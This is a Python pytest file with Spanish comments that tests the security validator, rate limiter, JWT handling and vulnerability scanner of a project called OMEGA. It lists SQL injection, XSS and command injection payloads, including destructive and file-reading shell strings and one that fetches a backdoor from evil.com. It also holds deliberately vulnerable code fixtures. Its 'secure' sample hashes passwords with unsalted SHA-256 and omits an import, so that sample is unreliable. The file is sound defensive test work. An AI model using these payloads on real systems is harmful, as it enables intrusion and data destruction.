#!/usr/bin/env python3
"""
🧪 Tests para el sistema de seguridad de OMEGA
"""

import pytest
import asyncio
from unittest.mock import Mock, patch, mock_open
import jwt
from datetime import datetime, timedelta

from src.security.security_manager import (
    SecurityManager, SecurityLevel, AuditEventType,
    InputValidator, RateLimiter
)
from src.security.vulnerability_scanner import (
    VulnerabilityScanner, VulnerabilityType, VulnerabilitySeverity
)

@pytest.mark.security
class TestSecurityManager:
    """Tests para SecurityManager"""
    
    @pytest.fixture
    def security_manager(self):
        """Fixture de SecurityManager"""
        return SecurityManager()
    
    @pytest.mark.asyncio
    async def test_input_validation_sql_injection(self, security_manager):
        """Test validación de SQL injection"""
        malicious_data = {
            "query": "SELECT * FROM users WHERE id = '1' OR '1'='1'",
            "user_input": "'; DROP TABLE users; --"
        }
        
        result = await security_manager.validate_request(
            malicious_data, 
            user_id="test_user",
            ip_address="192.168.1.1"
        )
        
        assert not result["valid"]
        assert "sql_injection" in result["threats"]
        assert result["security_score"] < 100.0
    
    @pytest.mark.asyncio
    async def test_input_validation_xss(self, security_manager):
        """Test validación de XSS"""
        malicious_data = {
            "comment": "<script>alert('XSS')</script>",
            "name": "javascript:alert('hack')"
        }
        
        result = await security_manager.validate_request(malicious_data)
        
        assert not result["valid"]
        assert "xss" in result["threats"]
        assert "&lt;script&gt;" in result["sanitized_data"]["comment"]
    
    @pytest.mark.asyncio
    async def test_rate_limiting(self, security_manager):
        """Test sistema de rate limiting"""
        ip_address = "192.168.1.100"
        
        # Primeros requests deben pasar
        for i in range(5):
            result = await security_manager.validate_request(
                {"test": "data"}, 
                ip_address=ip_address
            )
            assert result["valid"]
        
        # Simular muchos requests rápidos
        security_manager.rate_limiter.limits["api_requests"]["count"] = 5
        
        for i in range(10):
            security_manager.rate_limiter.is_allowed(ip_address, "api_requests")
        
        # El siguiente request debe ser bloqueado
        result = await security_manager.validate_request(
            {"test": "data"}, 
            ip_address=ip_address
        )
        assert result["blocked"]
        assert "rate_limit_exceeded" in result["threats"]
    
    def test_jwt_token_creation_and_verification(self, security_manager):
        """Test creación y verificación de JWT tokens"""
        user_id = "test_user_123"
        permissions = ["read", "write"]
        ip_address = "192.168.1.1"
        
        # Crear token
        tokens = security_manager.create_jwt_token(
            user_id=user_id,
            permissions=permissions,
            ip_address=ip_address
        )
        
        assert "access_token" in tokens
        assert "refresh_token" in tokens
        assert tokens["token_type"] == "Bearer"
        
        # Verificar token
        verification = security_manager.verify_jwt_token(
            tokens["access_token"],
            ip_address=ip_address
        )
        
        assert verification["valid"]
        assert verification["user_id"] == user_id
        assert verification["permissions"] == permissions
    
    def test_jwt_token_ip_mismatch(self, security_manager):
        """Test JWT token con IP diferente"""
        tokens = security_manager.create_jwt_token(
            user_id="test_user",
            ip_address="192.168.1.1"
        )
        
        # Verificar con IP diferente
        verification = security_manager.verify_jwt_token(
            tokens["access_token"],
            ip_address="192.168.1.2"
        )
        
        assert not verification["valid"]
        assert "IP mismatch" in verification["error"]
    
    def test_token_revocation(self, security_manager):
        """Test revocación de tokens"""
        user_id = "test_user_revoke"
        tokens = security_manager.create_jwt_token(user_id=user_id)
        
        # Token debe ser válido inicialmente
        verification = security_manager.verify_jwt_token(tokens["access_token"])
        assert verification["valid"]
        
        # Revocar token
        revoked = security_manager.revoke_token(user_id, "access")
        assert revoked
        
        # Token debe ser inválido después de revocación
        verification = security_manager.verify_jwt_token(tokens["access_token"])
        assert not verification["valid"]
    
    def test_password_hashing_and_verification(self, security_manager):
        """Test hash y verificación de passwords"""
        password = "test_password_123!"
        
        # Hash password
        hashed = security_manager.hash_password(password)
        assert hashed != password
        assert len(hashed) > 50  # bcrypt hash es largo
        
        # Verificar password correcto
        assert security_manager.verify_password(password, hashed)
        
        # Verificar password incorrecto
        assert not security_manager.verify_password("wrong_password", hashed)
    
    def test_password_strength_validation(self, security_manager):
        """Test validación de fortaleza de passwords"""
        # Password débil
        weak = security_manager.validate_password_strength("123")
        assert not weak["valid"]
        assert weak["score"] < 50
        assert "Must be at least" in " ".join(weak["issues"])
        
        # Password fuerte
        strong = security_manager.validate_password_strength("StrongP@ssw0rd123!")
        assert strong["valid"]
        assert strong["score"] >= 70
        assert strong["strength"] in ["Strong", "Very Strong"]
    
    @pytest.mark.asyncio
    async def test_audit_logging(self, security_manager):
        """Test logging de auditoría"""
        initial_count = len(security_manager.audit_events)
        
        # Simular evento que genera log
        await security_manager.validate_request(
            {"test": "data"},
            user_id="test_user",
            ip_address="192.168.1.1"
        )
        
        # Debe haber un nuevo evento de auditoría
        assert len(security_manager.audit_events) > initial_count
        
        latest_event = security_manager.audit_events[-1]
        assert latest_event.event_type == AuditEventType.API_ACCESS
        assert latest_event.user_id == "test_user"
        assert latest_event.ip_address == "192.168.1.1"
    
    def test_security_summary(self, security_manager):
        """Test resumen de seguridad"""
        summary = security_manager.get_security_summary()
        
        assert "security_status" in summary
        assert "events_last_24h" in summary
        assert "active_tokens" in summary
        assert "policies_enabled" in summary
        
        # Debe tener políticas habilitadas por defecto
        assert summary["policies_enabled"] > 0

class TestInputValidator:
    """Tests para InputValidator"""
    
    @pytest.fixture
    def validator(self):
        """Fixture de InputValidator"""
        return InputValidator()
    
    def test_sql_injection_detection(self, validator):
        """Test detección de SQL injection"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; INSERT INTO users VALUES('hacker', 'pass')",
            "' UNION SELECT * FROM passwords --"
        ]
        
        for malicious_input in malicious_inputs:
            result = validator.validate_string(malicious_input, "test_field")
            assert not result["valid"], f"Failed to detect SQL injection: {malicious_input}"
            assert "sql_injection" in result["threats"]
    
    def test_xss_detection(self, validator):
        """Test detección de XSS"""
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "javascript:alert('hack')",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "onload=alert('XSS')"
        ]
        
        for malicious_input in malicious_inputs:
            result = validator.validate_string(malicious_input, "test_field")
            assert not result["valid"], f"Failed to detect XSS: {malicious_input}"
            assert "xss" in result["threats"]
    
    def test_command_injection_detection(self, validator):
        """Test detección de command injection"""
        malicious_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget evil.com/backdoor",
            "`id`",
            "$(whoami)"
        ]
        
        for malicious_input in malicious_inputs:
            result = validator.validate_string(malicious_input, "test_field")
            assert not result["valid"], f"Failed to detect command injection: {malicious_input}"
            assert "command_injection" in result["threats"]
    
    def test_safe_input_validation(self, validator):
        """Test validación de entrada segura"""
        safe_inputs = [
            "normal text",
            "user@example.com", 
            "123-456-7890",
            "Safe input with números 123",
            "Text with 'single' and \"double\" quotes"
        ]
        
        for safe_input in safe_inputs:
            result = validator.validate_string(safe_input, "test_field")
            assert result["valid"], f"False positive on safe input: {safe_input}"
            assert len(result["threats"]) == 0
    
    def test_prediction_request_validation(self, validator):
        """Test validación de request de predicción"""
        # Request malicioso
        malicious_request = {
            "query": "SELECT * FROM predictions WHERE id = '1' OR '1'='1'",
            "user_input": "<script>alert('hack')</script>",
            "safe_field": "normal value"
        }
        
        result = validator.validate_prediction_request(malicious_request)
        
        assert not result["valid"]
        assert len(result["threats"]) > 0
        assert "sanitized" in str(result["data"]["user_input"])
        assert result["data"]["safe_field"] == "normal value"  # Safe field unchanged

class TestRateLimiter:
    """Tests para RateLimiter"""
    
    @pytest.fixture
    def rate_limiter(self):
        """Fixture de RateLimiter"""
        limiter = RateLimiter()
        # Configurar límites más bajos para testing
        limiter.limits["test"] = {"count": 3, "window": 60}
        return limiter
    
    def test_rate_limiting_basic(self, rate_limiter):
        """Test básico de rate limiting"""
        client_id = "test_client"
        
        # Primeros requests deben pasar
        for i in range(3):
            assert rate_limiter.is_allowed(client_id, "test")
        
        # El cuarto request debe ser bloqueado
        assert not rate_limiter.is_allowed(client_id, "test")
    
    def test_rate_limiting_different_clients(self, rate_limiter):
        """Test rate limiting para diferentes clientes"""
        # Cliente 1 usa todos sus requests
        for i in range(3):
            assert rate_limiter.is_allowed("client1", "test")
        assert not rate_limiter.is_allowed("client1", "test")
        
        # Cliente 2 debe tener su propio límite
        for i in range(3):
            assert rate_limiter.is_allowed("client2", "test")
        assert not rate_limiter.is_allowed("client2", "test")
    
    def test_rate_limiting_window_expiry(self, rate_limiter):
        """Test expiración de ventana de tiempo"""
        import time
        
        client_id = "expiry_test"
        
        # Usar todos los requests
        for i in range(3):
            assert rate_limiter.is_allowed(client_id, "test")
        assert not rate_limiter.is_allowed(client_id, "test")
        
        # Modificar timestamps para simular expiración
        # (En test real usaríamos mock de time)
        current_time = time.time()
        rate_limiter.requests[client_id] = [current_time - 70]  # Más antiguo que window
        
        # Ahora debe permitir nuevos requests
        assert rate_limiter.is_allowed(client_id, "test")
    
    def test_remaining_requests(self, rate_limiter):
        """Test contador de requests restantes"""
        client_id = "remaining_test"
        
        # Al inicio debe tener el máximo
        assert rate_limiter.get_remaining_requests(client_id, "test") == 3
        
        # Después de un request, debe tener 2
        rate_limiter.is_allowed(client_id, "test")
        assert rate_limiter.get_remaining_requests(client_id, "test") == 2
        
        # Después de usar todos
        rate_limiter.is_allowed(client_id, "test")
        rate_limiter.is_allowed(client_id, "test")
        assert rate_limiter.get_remaining_requests(client_id, "test") == 0

@pytest.mark.integration
class TestSecurityIntegration:
    """Tests de integración del sistema de seguridad"""
    
    @pytest.mark.asyncio
    async def test_full_security_pipeline(self):
        """Test pipeline completo de seguridad"""
        security_manager = SecurityManager()
        
        # Simular request malicioso
        malicious_request = {
            "user_input": "'; DROP TABLE users; --",
            "comment": "<script>alert('XSS')</script>"
        }
        
        # Pipeline completo
        result = await security_manager.validate_request(
            malicious_request,
            user_id="test_hacker",
            ip_address="192.168.1.100"
        )
        
        # Debe detectar amenazas y sanitizar
        assert not result["valid"]
        assert len(result["threats"]) > 0
        assert result["security_score"] < 100
        
        # Debe haber eventos de auditoría
        assert len(security_manager.audit_events) > 0
        
        # El último evento debe ser de violación de seguridad o acceso API
        last_event = security_manager.audit_events[-1]
        assert last_event.event_type in [AuditEventType.API_ACCESS, AuditEventType.SECURITY_VIOLATION]
        assert last_event.user_id == "test_hacker"
    
    @pytest.mark.asyncio 
    async def test_security_scan_integration(self):
        """Test integración con escáner de vulnerabilidades"""
        scanner = VulnerabilityScanner()
        
        # Crear archivo temporal con código vulnerable
        vulnerable_code = '''
import os

def unsafe_function(user_input):
    # SQL Injection vulnerability
    query = "SELECT * FROM users WHERE name = '" + user_input + "'"
    
    # Command injection vulnerability
    os.system("ls " + user_input)
    
    # Hardcoded secret
    api_key = "sk-1234567890abcdef"
    
    return query
        '''
        
        with patch("builtins.open", mock_open(read_data=vulnerable_code)):
            with patch("os.path.exists", return_value=True):
                with patch("os.walk", return_value=[(".", [], ["test.py"])]):
                    # Escanear proyecto
                    results = await scanner.scan_project("/fake/project")
        
        # Debe detectar vulnerabilidades
        assert results["summary"]["total_vulnerabilities"] > 0
        assert results["summary"]["security_score"] < 100
        
        # Debe tener diferentes tipos de vulnerabilidades
        vulns_by_severity = results["vulnerabilities_by_severity"]
        assert len(vulns_by_severity) > 0
    
    def test_authentication_authorization_flow(self):
        """Test flujo completo de autenticación y autorización"""
        security_manager = SecurityManager()
        
        # 1. Crear usuario con permisos
        user_id = "test_user"
        permissions = ["read:predictions", "write:config"]
        
        # 2. Crear token
        tokens = security_manager.create_jwt_token(
            user_id=user_id,
            permissions=permissions
        )
        
        # 3. Verificar token
        verification = security_manager.verify_jwt_token(tokens["access_token"])
        assert verification["valid"]
        assert verification["permissions"] == permissions
        
        # 4. Simular logout (revocar token)
        security_manager.revoke_token(user_id, "access")
        
        # 5. Token debe ser inválido después de revocación
        verification = security_manager.verify_jwt_token(tokens["access_token"])
        assert not verification["valid"]

# Fixtures adicionales para testing
@pytest.fixture
def sample_vulnerable_file():
    """Fixture con código vulnerable de muestra"""
    return '''
import os
import pickle
import hashlib

def vulnerable_function(user_input):
    # SQL Injection
    query = "SELECT * FROM users WHERE id = " + user_input
    
    # Command Injection  
    os.system("grep " + user_input + " /var/log/app.log")
    
    # Weak crypto
    password_hash = hashlib.md5(user_input.encode()).hexdigest()
    
    # Hardcoded secret
    SECRET_KEY = "hardcoded-secret-123"
    
    # Pickle deserialization
    data = pickle.loads(user_input)
    
    return data
    '''

@pytest.fixture
def secure_code_sample():
    """Fixture con código seguro de muestra"""  
    return '''
import hashlib
import secrets
from sqlalchemy import text

def secure_function(user_input):
    # Parameterized query
    query = text("SELECT * FROM users WHERE id = :user_id")
    
    # Strong crypto
    password_hash = hashlib.sha256(user_input.encode()).hexdigest()
    
    # Secure random
    token = secrets.token_urlsafe(32)
    
    # Environment variable
    SECRET_KEY = os.environ.get("SECRET_KEY")
    
    return {"hash": password_hash, "token": token}
    '''